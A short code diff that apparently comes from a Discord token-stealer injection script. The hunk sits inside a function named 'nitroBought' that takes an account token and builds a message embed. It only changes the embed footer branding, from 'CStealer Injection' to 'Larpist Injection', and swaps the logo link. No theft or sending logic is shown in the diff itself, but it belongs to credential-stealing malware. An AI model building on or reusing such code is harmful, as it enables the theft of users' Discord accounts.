@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Larpist Injection・https://github.com/depicting',
+            icon_url: "https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless"
         },
       },
     ],
